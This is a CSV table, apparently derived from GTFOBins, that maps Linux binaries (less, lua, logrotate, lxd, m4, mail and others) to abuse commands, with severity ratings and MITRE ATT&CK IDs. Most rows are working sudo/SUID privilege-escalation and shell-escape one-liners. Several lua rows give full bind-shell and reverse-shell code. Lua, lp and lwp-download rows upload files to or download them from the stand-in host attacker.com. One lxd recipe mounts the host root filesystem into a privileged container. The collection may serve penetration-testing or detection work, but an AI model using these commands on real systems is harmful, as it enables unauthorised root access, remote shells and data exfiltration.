881,Linux,less /path/to/input-file,Abuse the 'less' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/less/
882,Linux,less /path/to/input-file,Abuse the 'less' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/less/
883,Linux,less /path/to/input-file,Abuse the 'less' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/less/
884,Linux,less /etc/hosts :e /path/to/input-file,"Abuse the 'less' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This can be used to read another file, e.g., when invoked as a pager with some fixed content.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/less/
885,Linux,less /etc/hosts :e /path/to/input-file,"Abuse the 'less' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This can be used to read another file, e.g., when invoked as a pager with some fixed content.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/less/
886,Linux,less /etc/hosts :e /path/to/input-file,"Abuse the 'less' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This can be used to read another file, e.g., when invoked as a pager with some fixed content.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/less/
887,Linux,LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts,Abuse the 'less' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This can be used to read another file.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/less/
888,Linux,LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts,Abuse the 'less' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This can be used to read another file.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/less/
889,Linux,echo DATA | less s/path/to/output-file q,Abuse the 'less' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/less/
890,Linux,echo DATA | less s/path/to/output-file q,Abuse the 'less' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/less/
891,Linux,echo DATA | less s/path/to/output-file q,Abuse the 'less' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/less/
892,Linux,less /etc/hosts v,Abuse the 'less' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/less/
893,Linux,less /etc/hosts v,Abuse the 'less' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/less/
894,Linux,less /etc/hosts v,Abuse the 'less' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/less/
895,Linux,less /etc/hosts !/bin/sh,Abuse the 'less' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/less/
896,Linux,less /etc/hosts !/bin/sh,Abuse the 'less' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/less/
897,Linux,less /etc/hosts !/bin/sh,Abuse the 'less' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/less/
898,Linux,"LESSOPEN=""/bin/sh -s 1>&0 2>&0 # %s"" less /etc/hosts reset",Abuse the 'less' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The optional `reset` command is needed to receive the echo back of the typed keystrokes.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/less/
899,Linux,"LESSOPEN=""/bin/sh -s 1>&0 2>&0 # %s"" less /etc/hosts reset",Abuse the 'less' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The optional `reset` command is needed to receive the echo back of the typed keystrokes.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/less/
900,Linux,VISUAL='/bin/sh -s --' less /etc/hosts v,Abuse the 'less' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/less/
901,Linux,VISUAL='/bin/sh -s --' less /etc/hosts v,Abuse the 'less' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/less/
902,Linux,lftp -c '!/bin/sh',Abuse the 'lftp' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/lftp/
903,Linux,lftp -c '!/bin/sh',Abuse the 'lftp' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/lftp/
904,Linux,lftp -c '!/bin/sh',Abuse the 'lftp' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/lftp/
905,Linux,links /path/to/input-file,Abuse the 'links' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The result is displayed in a TUI interface.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/links/
906,Linux,links /path/to/input-file,Abuse the 'links' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The result is displayed in a TUI interface.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/links/
907,Linux,links /path/to/input-file,Abuse the 'links' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The result is displayed in a TUI interface.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/links/
908,Linux,ln -fs /bin/sh /bin/ln ln,"Abuse the 'ln' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ln/
909,Linux,loginctl user-status !/bin/sh,Abuse the 'loginctl' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/loginctl/
910,Linux,loginctl user-status !/bin/sh,Abuse the 'loginctl' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/loginctl/
911,Linux,logrotate /path/to/input-file,Abuse the 'logrotate' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The first word is returned in a error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/logrotate/
912,Linux,logrotate /path/to/input-file,Abuse the 'logrotate' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The first word is returned in a error message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/logrotate/
913,Linux,logrotate /path/to/input-file,Abuse the 'logrotate' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The first word is returned in a error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/logrotate/
914,Linux,logrotate -l /path/to/output-file DATA,Abuse the 'logrotate' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The content is written in a log file.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/logrotate/
915,Linux,logrotate -l /path/to/output-file DATA,Abuse the 'logrotate' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The content is written in a log file.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/logrotate/
916,Linux,logrotate -l /path/to/output-file DATA,Abuse the 'logrotate' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The content is written in a log file.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/logrotate/
917,Linux,echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh logrotate -m /path/to/temp-file.sh -f /path/to/temp-file,"Abuse the 'logrotate' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/logrotate/
918,Linux,logsave /dev/null /bin/sh -i,Abuse the 'logsave' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/logsave/
919,Linux,logsave /dev/null /bin/sh -i -p,Abuse the 'logsave' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/logsave/
920,Linux,logsave /dev/null /bin/sh -i,Abuse the 'logsave' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/logsave/
921,Linux,look '' /path/to/input-file,Abuse the 'look' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/look/
922,Linux,look '' /path/to/input-file,Abuse the 'look' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/look/
923,Linux,look '' /path/to/input-file,Abuse the 'look' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/look/
924,Linux,lp /path/to/input-file -h attacker.com,Abuse the 'lp' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. This requires `cups` to be installed. Run the following on the attacker box beforehand: 1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer; 2. `lpadmin -d printer` to set the new printer as default; 3. `cupsctl --remote-any` to enable printing from the Internet.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/lp/
925,Linux,lp /path/to/input-file -h attacker.com,Abuse the 'lp' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. This requires `cups` to be installed. Run the following on the attacker box beforehand: 1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer; 2. `lpadmin -d printer` to set the new printer as default; 3. `cupsctl --remote-any` to enable printing from the Internet.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/lp/
926,Linux,lp /path/to/input-file -h attacker.com,Abuse the 'lp' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires `cups` to be installed. Run the following on the attacker box beforehand: 1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer; 2. `lpadmin -d printer` to set the new printer as default; 3. `cupsctl --remote-any` to enable printing from the Internet.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/lp/
927,Linux,ltrace -F /path/to/input-file /dev/null,Abuse the 'ltrace' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is parsed as a configuration file and its content is shown as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ltrace/
928,Linux,ltrace -F /path/to/input-file /dev/null,Abuse the 'ltrace' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is parsed as a configuration file and its content is shown as error messages.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ltrace/
929,Linux,ltrace -F /path/to/input-file /dev/null,Abuse the 'ltrace' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is parsed as a configuration file and its content is shown as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ltrace/
930,Linux,ltrace -s 999 -o /path/to/input-file ltrace -F DATA,"Abuse the 'ltrace' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ltrace/
931,Linux,ltrace -s 999 -o /path/to/input-file ltrace -F DATA,"Abuse the 'ltrace' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/ltrace/
932,Linux,ltrace -b -L /bin/sh,Abuse the 'ltrace' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ltrace/
933,Linux,ltrace -b -L /bin/sh,Abuse the 'ltrace' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ltrace/
934,Linux,"lua -e ' local k=require(""socket""); local s=assert(k.bind(""*"",12345)); local c=s:accept(); while true do local r,x=c:receive();local f=assert(io.popen(r,""r"")); local b=assert(f:read(""*a""));c:send(b); end;c:close();f:close();'",Abuse the 'lua' binary (bind shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/lua/
935,Linux,"lua -e ' local k=require(""socket""); local s=assert(k.bind(""*"",12345)); local c=s:accept(); while true do local r,x=c:receive();local f=assert(io.popen(r,""r"")); local b=assert(f:read(""*a""));c:send(b); end;c:close();f:close();'",Abuse the 'lua' binary (bind shell) in a suid context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/lua/
936,Linux,"lua -e ' local k=require(""socket""); local s=assert(k.bind(""*"",12345)); local c=s:accept(); while true do local r,x=c:receive();local f=assert(io.popen(r,""r"")); local b=assert(f:read(""*a""));c:send(b); end;c:close();f:close();'",Abuse the 'lua' binary (bind shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,Bind Shell,High,T1059,https://gtfobins.github.io/gtfobins/lua/
937,Linux,"lua -e ' local k=require(""socket""); local s=assert(k.bind(""*"",12345)); local c=s:accept(); local d,x=c:receive(""*a""); c:close(); local f=io.open(""/path/to/output-file"", ""wb""); f:write(d); io.close(f);'",Abuse the 'lua' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/lua/
938,Linux,"lua -e ' local k=require(""socket""); local s=assert(k.bind(""*"",12345)); local c=s:accept(); local d,x=c:receive(""*a""); c:close(); local f=io.open(""/path/to/output-file"", ""wb""); f:write(d); io.close(f);'",Abuse the 'lua' binary (download) in a suid context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/lua/
939,Linux,"lua -e ' local k=require(""socket""); local s=assert(k.bind(""*"",12345)); local c=s:accept(); local d,x=c:receive(""*a""); c:close(); local f=io.open(""/path/to/output-file"", ""wb""); f:write(d); io.close(f);'",Abuse the 'lua' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/lua/
940,Linux,"lua -e 'local f=io.open(""/path/to/input-file"", ""rb""); io.write(f:read(""*a"")); io.close(f);'",Abuse the 'lua' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/lua/
941,Linux,"lua -e 'local f=io.open(""/path/to/input-file"", ""rb""); io.write(f:read(""*a"")); io.close(f);'",Abuse the 'lua' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/lua/
942,Linux,"lua -e 'local f=io.open(""/path/to/input-file"", ""rb""); io.write(f:read(""*a"")); io.close(f);'",Abuse the 'lua' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/lua/
943,Linux,"lua -e 'local f=io.open(""/path/to/output-file"", ""wb""); f:write(""DATA""); io.close(f);'",Abuse the 'lua' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/lua/
944,Linux,"lua -e 'local f=io.open(""/path/to/output-file"", ""wb""); f:write(""DATA""); io.close(f);'",Abuse the 'lua' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/lua/
945,Linux,"lua -e 'local f=io.open(""/path/to/output-file"", ""wb""); f:write(""DATA""); io.close(f);'",Abuse the 'lua' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/lua/
946,Linux,"lua -e ' local s=require(""socket""); local t=assert(s.tcp()); t:connect(""attacker.com"",12345); while true do local r,x=t:receive();local f=assert(io.popen(r,""r"")); local b=assert(f:read(""*a""));t:send(b); end; f:close();t:close();'",Abuse the 'lua' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/lua/
947,Linux,"lua -e ' local s=require(""socket""); local t=assert(s.tcp()); t:connect(""attacker.com"",12345); while true do local r,x=t:receive();local f=assert(io.popen(r,""r"")); local b=assert(f:read(""*a""));t:send(b); end; f:close();t:close();'",Abuse the 'lua' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/lua/
948,Linux,"lua -e ' local s=require(""socket""); local t=assert(s.tcp()); t:connect(""attacker.com"",12345); while true do local r,x=t:receive();local f=assert(io.popen(r,""r"")); local b=assert(f:read(""*a""));t:send(b); end; f:close();t:close();'",Abuse the 'lua' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/lua/
949,Linux,"lua -e 'os.execute(""/bin/sh"")'",Abuse the 'lua' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/lua/
950,Linux,"lua -e 'os.execute(""/bin/sh"")'",Abuse the 'lua' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/lua/
951,Linux,"lua -e 'os.execute(""/bin/sh"")'",Abuse the 'lua' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/lua/
952,Linux,"lua -e ' local f=io.open(""/path/to/input-file"", ""rb"") local d=f:read(""*a"") io.close(f); local s=require(""socket""); local t=assert(s.tcp()); t:connect(""attacker.com"",12345); t:send(d); t:close();'",Abuse the 'lua' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/lua/
953,Linux,"lua -e ' local f=io.open(""/path/to/input-file"", ""rb"") local d=f:read(""*a"") io.close(f); local s=require(""socket""); local t=assert(s.tcp()); t:connect(""attacker.com"",12345); t:send(d); t:close();'",Abuse the 'lua' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/lua/
954,Linux,"lua -e ' local f=io.open(""/path/to/input-file"", ""rb"") local d=f:read(""*a"") io.close(f); local s=require(""socket""); local t=assert(s.tcp()); t:connect(""attacker.com"",12345); t:send(d); t:close();'",Abuse the 'lua' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires `lua-socket` to be available.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/lua/
955,Linux,lualatex -shell-escape '\directlua{...}\end',Abuse the 'lualatex' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/lualatex/
956,Linux,lualatex -shell-escape '\directlua{...}\end',Abuse the 'lualatex' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/lualatex/
957,Linux,lualatex -shell-escape '\directlua{...}\end',Abuse the 'lualatex' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/lualatex/
958,Linux,luatex -shell-escape '\directlua{...}\end',Abuse the 'luatex' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/luatex/
959,Linux,luatex -shell-escape '\directlua{...}\end',Abuse the 'luatex' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/luatex/
960,Linux,luatex -shell-escape '\directlua{...}\end',Abuse the 'luatex' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/luatex/
961,Linux,lwp-download http://attacker.com/path/to/input-file /path/to/output-file,"Abuse the 'lwp-download' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/lwp-download/
962,Linux,lwp-download http://attacker.com/path/to/input-file /path/to/output-file,"Abuse the 'lwp-download' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.",File Download,Low,T1105,https://gtfobins.github.io/gtfobins/lwp-download/
963,Linux,lwp-download file:///path/to/input-file /dev/stdout,Abuse the 'lwp-download' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/lwp-download/
964,Linux,lwp-download file:///path/to/input-file /dev/stdout,Abuse the 'lwp-download' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/lwp-download/
965,Linux,echo DATA >/path/to/temp-file lwp-download file:///path/to/temp-file /path/to/output-file,Abuse the 'lwp-download' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/lwp-download/
966,Linux,echo DATA >/path/to/temp-file lwp-download file:///path/to/temp-file /path/to/output-file,Abuse the 'lwp-download' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/lwp-download/
967,Linux,lwp-download file:///path/to/input-file /path/to/output-file,Abuse the 'lwp-download' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This actually copies a file to a destination.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/lwp-download/
968,Linux,lwp-download file:///path/to/input-file /path/to/output-file,Abuse the 'lwp-download' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This actually copies a file to a destination.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/lwp-download/
969,Linux,lwp-request file:///path/to/input-file,Abuse the 'lwp-request' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/lwp-request/
970,Linux,lwp-request file:///path/to/input-file,Abuse the 'lwp-request' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/lwp-request/
971,Linux,lxc init ubuntu:16.04 x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true lxc start x lxc exec x /bin/sh,"Abuse the 'lxd' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/lxd/
972,Linux,lxc init ubuntu:16.04 x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true lxc start x lxc exec x /bin/sh,"Abuse the 'lxd' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/lxd/
973,Linux,lxc image import ./alpine*.tar.gz --alias x lxc init x x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true lxc start x lxc exec x /bin/sh,"Abuse the 'lxd' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder): ``` git clone https://github.com/saghul/lxd-alpine-builder cd lxd-alpine-builder sudo ./build-alpine -a i686 ```",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/lxd/
974,Linux,lxc image import ./alpine*.tar.gz --alias x lxc init x x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true lxc start x lxc exec x /bin/sh,"Abuse the 'lxd' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder): ``` git clone https://github.com/saghul/lxd-alpine-builder cd lxd-alpine-builder sudo ./build-alpine -a i686 ```",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/lxd/
975,Linux,echo 'esyscmd(/path/to/command)' | m4,Abuse the 'm4' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/m4/
976,Linux,echo 'esyscmd(/path/to/command)' | m4,Abuse the 'm4' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/m4/
977,Linux,echo 'esyscmd(/path/to/command)' | m4,Abuse the 'm4' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/m4/
978,Linux,m4 /path/to/input-file,Abuse the 'm4' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/m4/
979,Linux,m4 /path/to/input-file,Abuse the 'm4' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/m4/
980,Linux,m4 /path/to/input-file,Abuse the 'm4' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/m4/
981,Linux,echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4,Abuse the 'm4' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/m4/
982,Linux,echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4,Abuse the 'm4' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/m4/
983,Linux,echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4,Abuse the 'm4' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/m4/
984,Linux,mail --exec='!/bin/sh',Abuse the 'mail' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/mail/
985,Linux,mail --exec='!/bin/sh',Abuse the 'mail' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/mail/
986,Linux,mail --exec='!/bin/sh',Abuse the 'mail' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/mail/
987,Linux,mail -f /etc/hosts !/bin/sh,Abuse the 'mail' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/mail/
988,Linux,mail -f /etc/hosts !/bin/sh,Abuse the 'mail' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/mail/
989,Linux,mail -f /etc/hosts !/bin/sh,Abuse the 'mail' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/mail/
